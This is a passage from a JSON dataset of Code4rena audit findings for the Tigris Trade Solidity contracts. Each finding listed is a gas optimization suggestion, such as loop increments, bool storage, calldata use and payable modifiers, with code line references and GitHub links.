100%\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L16\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43221",
      "title": "[G-28]  `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)",
      "impact": "GAS",
      "content": "Saves **5 gas per loop**\n\n*There are 21 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n/// @audit (valid but excluded finding)\n220:                  for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {\n\n/// @audit (valid but excluded finding)\n284:              for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n292:              for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n300:              for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n342:              for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L220\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit (valid but excluded finding)\n53:           for (uint i=0; i<assetsLength(); i++) {\n\n/// @audit (valid but excluded finding)\n67:           for (uint i=0; i<assetsLength(); i++) {\n\n/// @audit (valid but excluded finding)\n78:           for (uint i=0; i<assetsLength(); i++) {\n\n/// @audit (valid but excluded finding)\n95:           for (uint i=0; i<assetsLength(); i++) {\n\n/// @audit (valid but excluded finding)\n105:          for (uint i=0; i<_amount; i++) {\n\n/// @audit (valid but excluded finding)\n131:          for (uint i=0; i<tokenId.length; i++) {\n\n/// @audit (valid but excluded finding)\n200:          for (uint i=0; i<tokenId.length; i++) {\n\n/// @audit (valid but excluded finding)\n246:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n252:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n258:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n325:          for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L53\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit (valid but excluded finding)\n113:          for (uint i=0; i < assets.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L113\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit (valid but excluded finding)\n296:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n304:          for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L296\n\n```solidity\nFile: contracts/Referrals.sol\n\n/// @audit (valid but excluded finding)\n70:           for (uint i=0; i<_codeOwnersL; i++) {\n\n/// @audit (valid but excluded finding)\n73:           for (uint i=0; i<_referredAL; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L70\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43220",
      "title": "[G-27]  Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement",
      "impact": "GAS",
      "content": "This change saves **[6 gas](https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png)** per instance. The optimization works until solidity version [0.8.13](https://gist.github.com/IllIllI000/bf2c3120f24a69e489f12b3213c06c94) where there is a regression in gas costs.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit (valid but excluded finding)\n130:          require(tokenId.length > 0, \"Not bridging\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L130\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43219",
      "title": "[G-26]  Using `bool`s for storage incurs overhead",
      "impact": "GAS",
      "content": "```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past\n\n*There are 16 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n/// @audit (valid but excluded finding)\n32:       mapping(address => bool) public allowedAsset;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L32\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit (valid but excluded finding)\n22:       mapping(uint16 => mapping(address => bool)) public isTrustedAddress;\n\n/// @audit (valid but excluded finding)\n265:      mapping(address => bool) private _allowedAsset;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L22\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit (valid but excluded finding)\n18:       mapping(address => bool) public allowedAssets;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L18\n\n```solidity\nFile: contracts/PairsContract.sol\n\n/// @audit (valid but excluded finding)\n12:       mapping(uint256 => bool) public allowedAsset;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L12\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit (valid but excluded finding)\n20:       mapping(address => bool) private _isMinter; // Trading contract should be minter\n\n/// @audit (valid but excluded finding)\n34:       mapping(uint256 => mapping(address => mapping(bool => int256))) private accInterestPerOi;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L20\n\n```solidity\nFile: contracts/Referrals.sol\n\n/// @audit (valid but excluded finding)\n9:        bool private isInit;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L9\n\n```solidity\nFile: contracts/StableToken.sol\n\n/// @audit (valid but excluded finding)\n9:        mapping(address => bool) public isMinter;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L9\n\n```solidity\nFile: contracts/StableVault.sol\n\n/// @audit (valid but excluded finding)\n29:       mapping(address => bool) public allowed;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L29\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n/// @audit (valid but excluded finding)\n15:       bool public chainlinkEnabled;\n\n/// @audit (valid but excluded finding)\n17:       mapping(address => bool) private isNode;\n\n/// @audit (valid but excluded finding)\n19:       mapping(address => bool) public allowedMargin;\n\n/// @audit (valid but excluded finding)\n20:       bool public paused;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L15\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit (valid but excluded finding)\n134:      mapping(address => bool) public allowedVault;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L134\n\n```solidity\nFile: contracts/utils/MetaContext.sol\n\n/// @audit (valid but excluded finding)\n7:        mapping(address => bool) private _isTrustedForwarder;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/MetaContext.sol#L7\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43218",
      "title": "[G-25]  `<array>.length` should not be looked up in every loop of a `for`-loop",
      "impact": "GAS",
      "content": "The overheads outlined below are _PER LOOP_, excluding the first loop\n* storage arrays incur a Gwarmaccess (**100 gas**)\n* memory arrays use `MLOAD` (**3 gas**)\n* calldata arrays use `CALLDATALOAD` (**3 gas**)\n\nCaching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset\n\n*There are 13 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n/// @audit (valid but excluded finding)\n284:              for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n292:              for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n300:              for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n342:              for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L284\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit (valid but excluded finding)\n131:          for (uint i=0; i<tokenId.length; i++) {\n\n/// @audit (valid but excluded finding)\n200:          for (uint i=0; i<tokenId.length; i++) {\n\n/// @audit (valid but excluded finding)\n246:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n252:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n258:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n325:          for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L131\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit (valid but excluded finding)\n113:          for (uint i=0; i < assets.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L113\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit (valid but excluded finding)\n296:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n304:          for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L296\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43217",
      "title": "[G-24]  State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There are 20 instances of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit assets on line 54 - (valid but excluded finding)\n54:               userPaid[to][assets[i]] += accRewardsPerNFT[assets[i]];\n\n/// @audit assets on line 68 - (valid but excluded finding)\n68:               userPaid[to][assets[i]] += accRewardsPerNFT[assets[i]];\n\n/// @audit assets on line 79 - (valid but excluded finding)\n79:               userDebt[owner][assets[i]] += accRewardsPerNFT[assets[i]];\n\n/// @audit assets on line 79 - (valid but excluded finding)\n/// @audit assets on line 80 - (valid but excluded finding)\n80:               userDebt[owner][assets[i]] -= userPaid[owner][assets[i]]/balanceOf(owner);\n\n/// @audit assets on line 80 - (valid but excluded finding)\n/// @audit assets on line 81 - (valid but excluded finding)\n81:               userPaid[owner][assets[i]] -= userPaid[owner][assets[i]]/balanceOf(owner);            \n\n/// @audit assets on line 96 - (valid but excluded finding)\n96:               userDebt[from][assets[i]] += accRewardsPerNFT[assets[i]];\n\n/// @audit assets on line 96 - (valid but excluded finding)\n/// @audit assets on line 97 - (valid but excluded finding)\n97:               userDebt[from][assets[i]] -= userPaid[from][assets[i]]/balanceOf(from);\n\n/// @audit assets on line 97 - (valid but excluded finding)\n/// @audit assets on line 98 - (valid but excluded finding)\n98:               userPaid[from][assets[i]] -= userPaid[from][assets[i]]/balanceOf(from);\n\n/// @audit assets on line 98 - (valid but excluded finding)\n/// @audit assets on line 99 - (valid but excluded finding)\n99:               userPaid[to][assets[i]] += accRewardsPerNFT[assets[i]];\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L54\n\n```solidity\nFile: contracts/PairsContract.sol\n\n/// @audit _idToAsset[_asset].minLeverage on line 81 - (valid but excluded finding)\n84:           require(_idToAsset[_asset].maxLeverage >= _idToAsset[_asset].minLeverage, \"Wrong leverage values\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L84\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit _trades[_id].margin on line 232 - (valid but excluded finding)\n233:          initId[_id] = accInterestPerOi[_trades[_id].asset][_trades[_id].tigAsset][_trades[_id].direction]*int256(_trades[_id].margin*_trades[_id].leverage/1e18)/1e18;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L233\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit limitOrderPriceRange on line 496 - (valid but excluded finding)\n496:              if (_price > trade.price+trade.price*limitOrderPriceRange/DIVISION_CONSTANT || _price < trade.price-trade.price*limitOrderPriceRange/DIVISION_CONSTANT) revert(\"6\"); //LimitNotMet\n\n/// @audit maxWinPercent on line 625 - (valid but excluded finding)\n625:                  if (maxWinPercent > 0 && _toMint > _trade.margin*maxWinPercent/DIVISION_CONSTANT) {\n\n/// @audit maxWinPercent on line 625 - (valid but excluded finding)\n626:                      _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT;\n\n/// @audit blockDelay on line 861 - (valid but excluded finding)\n864:                  blockDelayPassed[_id].delay = block.number + blockDelay;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L496\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43216",
      "title": "[G-23]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas",
      "impact": "GAS",
      "content": "When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead. \n\nIf the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one\n\nNote that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved\n\n*There are 12 instances of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit _destination - (valid but excluded finding)\n/// @audit tokenId - (valid but excluded finding)\n124       function crossChain(\n125           uint16 _dstChainId,\n126           bytes memory _destination,\n127           address _to,\n128:          uint256[] memory tokenId\n\n/// @audit _srcAddress - (valid but excluded finding)\n/// @audit _payload - (valid but excluded finding)\n168       function lzReceive(\n169           uint16 _srcChainId,\n170           bytes memory _srcAddress,\n171           uint64 _nonce,\n172:          bytes memory _payload\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L124-L128\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit _ids - (valid but excluded finding)\n138       function sendNFTs(\n139           uint[] memory _ids\n140:      ) external onlyOwner() {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L138-L140\n\n```solidity\nFile: contracts/PairsContract.sol\n\n/// @audit _name - (valid but excluded finding)\n48:       function addAsset(uint256 _asset, string memory _name, address _chainlinkFeed, uint256 _minLeverage, uint256 _maxLeverage, uint256 _feeMultiplier, uint256 _baseFundingRate) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L48\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit _newBaseURI - (valid but excluded finding)\n85:       function setBaseURI(string memory _newBaseURI) external onlyOwner {\n\n/// @audit _mintTrade - (valid but excluded finding)\n131       function mint(\n132           MintTrade memory _mintTrade\n133:      ) external onlyMinter {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L85\n\n```solidity\nFile: contracts/Referrals.sol\n\n/// @audit _codeOwners - (valid but excluded finding)\n/// @audit _ownedCodes - (valid but excluded finding)\n/// @audit _referredA - (valid but excluded finding)\n/// @audit _referredTo - (valid but excluded finding)\n60        function initRefs(\n61            address[] memory _codeOwners,\n62            bytes32[] memory _ownedCodes,\n63            address[] memory _referredA,\n64            bytes32[] memory _referredTo\n65:       ) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L60-L65\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43215",
      "title": "[G-22]  Don't use `_msgSender()` if not supporting EIP-2771",
      "impact": "GAS",
      "content": "Use `msg.sender` if the code does not implement [EIP-2771 trusted forwarder](https://eips.ethereum.org/EIPS/eip-2771) support\n\n*There are 30 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n216:          IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n\n285:                  _transfer(_msgSender(), _to, _ids[i]);\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L216\n\n```solidity\nFile: contracts/GovNFT.sol\n\n65:           require(msg.sender == address(this) || _msgSender() == owner(), \"NotBridge\");\n\n106:              _mint(_msgSender(), counter);\n\n111:          _mint(_msgSender(), counter);\n\n132:              require(_msgSender() == ownerOf(tokenId[i]), \"Not the owner\");\n\n161:              payable(_msgSender()),\n\n174:          require(_msgSender() == address(endpoint), \"!Endpoint\");\n\n247:              _transfer(_msgSender(), _to, _ids[i]);\n\n276:          address _msgsender = _msgSender();\n\n289:          try IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L65\n\n```solidity\nFile: contracts/PairsContract.sol\n\n190:          require(_msgSender() == address(protocol), \"!Protocol\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L190\n\n```solidity\nFile: contracts/Position.sol\n\n315:          require(_isMinter[_msgSender()], \"!Minter\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L315\n\n```solidity\nFile: contracts/Referrals.sol\n\n22:           _referral[_hash] = _msgSender();\n\n23:           emit ReferralCreated(_msgSender(), _hash);\n\n81:           require(_msgSender() == address(protocol), \"!Protocol\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L22\n\n```solidity\nFile: contracts/StableToken.sol\n\n52:           require(isMinter[_msgSender()], \"!Minter\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L52\n\n```solidity\nFile: contracts/StableVault.sol\n\n46:           IERC20(_token).transferFrom(_msgSender(), address(this), _amount);\n\n48:               _msgSender(),\n\n56:           ERC20Permit(_token).permit(_msgSender(), address(this), _toAllow, _deadline, v, r, s);\n\n66:           IERC20Mintable(stable).burnFrom(_msgSender(), _amount);\n\n69:               _msgSender(),\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L46\n\n```solidity\nFile: contracts/Trading.sol\n\n520:              emit LimitOrderExecuted(trade.asset, trade.direction, trade.price, trade.leverage, trade.margin - _fee, _id, trade.trader, _msgSender());\n\n554:              emit PositionLiquidated(_id, _trade.trader, _msgSender());\n\n584:          proxyApprovals[_msgSender()] = Proxy(\n\n631:          emit PositionClosed(_id, _price, _percent, _toMint, _trade.trader, _isBot ? _msgSender() : _trade.trader);\n\n722:                      _msgSender(),\n\n798:                      _msgSender(),\n\n885:          if (_trader != _msgSender()) {\n\n887:              require(_proxy.proxy == _msgSender() && _proxy.time >= block.timestamp, \"Proxy not approved\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L520\n\n\n___\n\n## Excluded Gas Optimization Findings\nThese findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness\n\n| |Issue|Instances|Total Gas Saved|\n|-|:-|:-:|:-:|\n| [G&#x2011;23] | Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas | 12 |  1440 |\n| [G&#x2011;24] | State variables should be cached in stack variables rather than re-reading them from storage | 20 |  1940 |\n| [G&#x2011;25] | `<array>.length` should not be looked up in every loop of a `for`-loop | 13 |  39 |\n| [G&#x2011;26] | Using `bool`s for storage incurs overhead | 16 |  273600 |\n| [G&#x2011;27] | Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement | 1 |  6 |\n| [G&#x2011;28] | `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) | 21 |  105 |\n| [G&#x2011;29] | Using `private` rather than `public` for constants, saves gas | 3 |  - |\n| [G&#x2011;30] | Use custom errors rather than `revert()`/`require()` strings to save gas | 64 |  - |\n\nTotal: 150 instances over 8 issues with **277130 gas** saved\n\nGas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43214",
      "title": "[G-21]  Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are \n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost\n\n*There are 69 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n57        function createLock(\n58            address _asset,\n59            uint _amount,\n60            uint _period,\n61            address _owner\n62:       ) external onlyManager() returns(uint id) {\n\n97        function extendLock(\n98            uint _id,\n99            address _asset,\n100           uint _amount,\n101           uint _period,\n102           address _sender\n103:      ) external onlyManager() {\n\n137       function release(\n138           uint _id,\n139           address _releaser\n140:      ) external onlyManager() returns(uint amount, uint lockAmount, address asset, address _owner) {\n\n168       function claim(\n169           uint _id,\n170           address _claimer\n171:      ) public onlyManager() returns(uint amount, address tigAsset) {\n\n196       function claimDebt(\n197           address _user,\n198           address _tigAsset\n199:      ) public onlyManager() returns(uint amount) {\n\n349:      function addAsset(address _asset) external onlyOwner {\n\n357:      function setAllowedAsset(address _asset, bool _bool) external onlyOwner {\n\n362:      function setBaseURI(string calldata _newBaseURI) external onlyOwner {\n\n366       function setManager(\n367           address _manager\n368:      ) public onlyOwner() {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L57-L62\n\n```solidity\nFile: contracts/GovNFT.sol\n\n46:       function setBaseURI(string calldata _newBaseURI) external onlyOwner {\n\n104:      function mintMany(uint _amount) external onlyOwner {\n\n110:      function mint() external onlyOwner {\n\n114:      function setTrustedAddress(uint16 _chainId, address _contract, bool _bool) external onlyOwner {\n\n236:      function setGas(uint _gas) external onlyOwner {\n\n240:      function setEndpoint(ILayerZeroEndpoint _endpoint) external onlyOwner {\n\n300:      function addAsset(address _asset) external onlyOwner {\n\n307:      function setAllowedAsset(address _asset, bool _bool) external onlyOwner {\n\n311:      function setMaxBridge(uint256 _max) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L46\n\n```solidity\nFile: contracts/Lock.sol\n\n127       function editAsset(\n128           address _tigAsset,\n129           bool _isAllowed\n130:      ) external onlyOwner() {\n\n138       function sendNFTs(\n139           uint[] memory _ids\n140:      ) external onlyOwner() {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L127-L130\n\n```solidity\nFile: contracts/PairsContract.sol\n\n33:       function setAssetChainlinkFeed(uint256 _asset, address _feed) external onlyOwner {\n\n48:       function addAsset(uint256 _asset, string memory _name, address _chainlinkFeed, uint256 _minLeverage, uint256 _maxLeverage, uint256 _feeMultiplier, uint256 _baseFundingRate) external onlyOwner {\n\n73:       function updateAssetLeverage(uint256 _asset, uint256 _minLeverage, uint256 _maxLeverage) external onlyOwner {\n\n92:       function setAssetBaseFundingRate(uint256 _asset, uint256 _baseFundingRate) external onlyOwner {\n\n104:      function updateAssetFeeMultiplier(uint256 _asset, uint256 _feeMultiplier) external onlyOwner {\n\n115:      function pauseAsset(uint256 _asset, bool _isPaused) external onlyOwner {\n\n125:      function setMaxBaseFundingRate(uint256 _maxBaseFundingRate) external onlyOwner {\n\n129:      function setProtocol(address _protocol) external onlyOwner {\n\n139:      function setMaxOi(uint256 _asset, address _tigAsset, uint256 _maxOi) external onlyOwner {\n\n154:      function modifyLongOi(uint256 _asset, address _tigAsset, bool _onOpen, uint256 _amount) external onlyProtocol {\n\n174:      function modifyShortOi(uint256 _asset, address _tigAsset, bool _onOpen, uint256 _amount) external onlyProtocol {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L33\n\n```solidity\nFile: contracts/Position.sol\n\n85:       function setBaseURI(string memory _newBaseURI) external onlyOwner {\n\n99:       function updateFunding(uint256 _asset, address _tigAsset, uint256 _longOi, uint256 _shortOi, uint256 _baseFundingRate, uint _vaultFundingPercent) external onlyMinter {\n\n131       function mint(\n132           MintTrade memory _mintTrade\n133:      ) external onlyMinter {\n\n168:      function executeLimitOrder(uint256 _id, uint256 _price, uint256 _newMargin) external onlyMinter {\n\n197:      function modifyMargin(uint256 _id, uint256 _newMargin, uint256 _newLeverage) external onlyMinter {\n\n209:      function addToPosition(uint256 _id, uint256 _newMargin, uint256 _newPrice) external onlyMinter {\n\n220:      function setAccInterest(uint256 _id) external onlyMinter {\n\n230:      function reducePosition(uint256 _id, uint256 _percent) external onlyMinter {\n\n242:      function modifyTp(uint _id, uint _tpPrice) external onlyMinter {\n\n252:      function modifySl(uint _id, uint _slPrice) external 